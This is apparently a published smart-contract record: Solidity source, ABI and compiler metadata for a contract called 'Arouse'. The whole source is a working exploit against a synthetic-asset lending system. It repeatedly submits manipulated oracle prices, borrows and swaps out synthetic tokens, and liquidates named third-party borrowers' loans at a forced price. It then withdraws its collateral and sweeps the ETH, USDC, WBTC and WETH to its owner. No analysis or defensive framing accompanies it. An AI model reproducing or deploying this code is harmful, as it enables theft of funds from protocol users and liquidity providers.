{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.23;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IOpenOracleFramework {\r\n    function submitFeed(\r\n        uint256[] memory feedIDs,\r\n        uint256[] memory values\r\n    ) external;\r\n\r\n    function getFeed(\r\n        uint256 feedID\r\n    ) external view returns (uint256, uint256, uint256);\r\n}\r\n\r\ninterface IXToken is IERC20 {\r\n    function getLatestETHUSDPrice() external view returns (uint);\r\n\r\n    function getLatestPrice() external view returns (uint);\r\n}\r\n\r\ninterface IEtherCollateral {\r\n    function openLoan(\r\n        uint256 _loanAmount\r\n    ) external payable returns (uint256 loanID);\r\n\r\n    function loanAmountFromCollateral(\r\n        uint256 collateralAmount\r\n    ) external view returns (uint256);\r\n\r\n    function liquidateLoan(\r\n        address _loanCreatorsAddress,\r\n        uint256 _loanID,\r\n        uint256 _debtToCover\r\n    ) external;\r\n\r\n    function repayLoan(\r\n        address _loanCreatorsAddress,\r\n        uint256 _loanID,\r\n        uint256 _repayAmount\r\n    ) external;\r\n\r\n    function withdrawCollateral(\r\n        uint256 loanID,\r\n        uint256 withdrawAmount\r\n    ) external;\r\n}\r\n\r\nstruct Liquidation {\r\n    address loanCreator;\r\n    uint loanId;\r\n    uint amount;\r\n}\r\n\r\ncontract Arouse {\r\n    address owner;\r\n    IOpenOracleFramework oracle =\r\n        IOpenOracleFramework(0x00f0feed50DcDF57b4f1B532E8f5e7f291E0C84b);\r\n    IXToken xUSD = IXToken(0x118CC5A08beBc41695Ecd1bb0d8Bb60E68dd8d65);\r\n    IXToken xBTC = IXToken(0xb83534012b183746cFFdFe6AbBA359Cc2720d1cd);\r\n    IXToken xNANA = IXToken(0x13A1105D770c19f0bc7EAa63CB3F7B5B06f01966);\r\n    IXToken xCC = IXToken(0x7b4d9e591c6324cBBB1355bC50A27892Fd2af99c);\r\n    IEtherCollateral usdControl =\r\n        IEtherCollateral(0xe365d01b9A484747F2d1c7B7CdA697020E709fFd);\r\n    IEtherCollateral btcControl =\r\n        IEtherCollateral(0x72965768D9719F04A8b43f12CaEAf3a84F526873);\r\n    IEtherCollateral nanaControl =\r\n        IEtherCollateral(0x35876E24cA5c817E08EBcB24D82C748c5E2E3dB1);\r\n    IEtherCollateral ccControl =\r\n        IEtherCollateral(0x5ff07a6c0FF6cDcca7BEacD90964ebC14C678684);\r\n    IUniswapV2Router router =\r\n        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\r\n    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);\r\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function evokee() external payable {\r\n        _getBtc();\r\n        _getUsd();\r\n        _getNana();\r\n        _getCC();\r\n\r\n        _updateFeed(1900 ether); // your welcome\r\n\r\n        payable(owner).transfer(address(this).balance);\r\n        usdc.transfer(owner, usdc.balanceOf(address(this)));\r\n        wbtc.transfer(owner, wbtc.balanceOf(address(this)));\r\n        weth.transfer(owner, weth.balanceOf(address(this)));\r\n    }\r\n\r\n    function out(IERC20 token) external {\r\n        if (address(this).balance > 0) {\r\n            payable(owner).transfer(address(this).balance);\r\n        }\r\n        token.transfer(owner, token.balanceOf(address(this)));\r\n    }\r\n\r\n    function _updateFeed(uint value) internal {\r\n        uint256[] memory feeds = new uint256[](1);\r\n        feeds[0] = 0;\r\n\r\n        uint256[] memory values = new uint256[](1);\r\n        values[0] = value;\r\n\r\n        oracle.submitFeed(feeds, values);\r\n    }\r\n\r\n    function _genericGet(\r\n        IEtherCollateral controller,\r\n        IXToken xToken,\r\n        IERC20 swapToken,\r\n        uint swapIn,\r\n        uint swapOut,\r\n        uint colIn,\r\n        Liquidation[] memory liquidations\r\n    ) internal {\r\n        _updateFeed(10000000000 ether);\r\n\r\n        uint loan = controller.loanAmountFromCollateral(colIn);\r\n        uint loanId = controller.openLoan{value: 0.05 ether}(loan);\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(xToken);\r\n        path[1] = address(swapToken);\r\n\r\n        xToken.approve(address(router), swapIn);\r\n        router.swapExactTokensForTokens(\r\n            swapIn,\r\n            swapOut,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n\r\n        // start liquidation\r\n        _updateFeed(1);\r\n\r\n        for (uint i = 0; i < liquidations.length; i++) {\r\n            Liquidation memory liq = liquidations[i];\r\n            controller.liquidateLoan(liq.loanCreator, liq.loanId, liq.amount);\r\n        }\r\n\r\n        controller.repayLoan(\r\n            address(this),\r\n            loanId,\r\n            xToken.balanceOf(address(this))\r\n        ); // not necessary but fun\r\n\r\n        _updateFeed(10000000000000000 ether);\r\n        controller.withdrawCollateral(loanId, colIn);\r\n    }\r\n\r\n    function _getCC() internal {\r\n        Liquidation[] memory liquidations = new Liquidation[](2);\r\n        liquidations[0] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            1,\r\n            50000000000000000\r\n        );\r\n        liquidations[1] = Liquidation(\r\n            0x4602525fdEee4084aE863c5A81D605b498f4714e,\r\n            9,\r\n            100000000000000000\r\n        );\r\n    \r\n        _genericGet(\r\n            ccControl,\r\n            xCC,\r\n            weth,\r\n            10000 ether,\r\n            32809416853179046,\r\n            0.0499 ether,\r\n            liquidations\r\n        );\r\n    }\r\n\r\n    function _getNana() internal {\r\n        Liquidation[] memory liquidations = new Liquidation[](4);\r\n        liquidations[0] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            1,\r\n            100000000000000000000\r\n        );\r\n        liquidations[1] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            13,\r\n            200000000000000000000\r\n        );\r\n        liquidations[2] = Liquidation(\r\n            0x2A2CD7400F922085b62cA9Bd9AC0f16151f716Ab,\r\n            11,\r\n            32100000000000000000\r\n        );\r\n        liquidations[3] = Liquidation(\r\n            0x1c053CCBca2784B8B5eeA4B51eB6aD9cB10a54B8,\r\n            14,\r\n            1000000000000000\r\n        );\r\n\r\n        _genericGet(\r\n            nanaControl,\r\n            xNANA,\r\n            usdc,\r\n            1000000 ether,\r\n            138064040,\r\n            0.0494 ether,\r\n            liquidations\r\n        );\r\n    }\r\n\r\n    function _getBtc() internal {\r\n        Liquidation[] memory liquidations = new Liquidation[](4);\r\n        liquidations[0] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            1,\r\n            2000000000000000\r\n        );\r\n        liquidations[1] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            2,\r\n            2000000000000000\r\n        );\r\n        liquidations[2] = Liquidation(\r\n            0x1c053CCBca2784B8B5eeA4B51eB6aD9cB10a54B8,\r\n            7,\r\n            2000000000000000\r\n        );\r\n        liquidations[3] = Liquidation(\r\n            0x609Ee908945c9CCa4055a4B6289B46717c726D5e,\r\n            8,\r\n            5577406228549\r\n        );\r\n\r\n        _genericGet(\r\n            btcControl,\r\n            xBTC,\r\n            wbtc,\r\n            10 ether,\r\n            701173,\r\n            0.0499 ether,\r\n            liquidations\r\n        );\r\n    }\r\n\r\n    function _getUsd() internal {\r\n        Liquidation[] memory liquidations = new Liquidation[](4);\r\n        liquidations[0] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            1,\r\n            100000000000000000000\r\n        );\r\n        liquidations[1] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            2,\r\n            100000000000000000000\r\n        );\r\n        liquidations[2] = Liquidation(\r\n            0x9D31e30003f253563Ff108BC60B16Fdf2c93abb5,\r\n            15,\r\n            2000000000000000000000\r\n        );\r\n        liquidations[3] = Liquidation(\r\n            0xf1228C34651348F12d05D138896DC6d2E946F970,\r\n            4,\r\n            320000000000000000\r\n        );\r\n\r\n        _genericGet(\r\n            usdControl,\r\n            xUSD,\r\n            usdc,\r\n            1000000 ether,\r\n            972251761,\r\n            0.0499 ether,\r\n            liquidations\r\n        );\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"evokee\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"out\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Arouse", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b90ac2e24edda707199613a597e757966da5cb4f403f1feec9fbfe7b82095c2d"}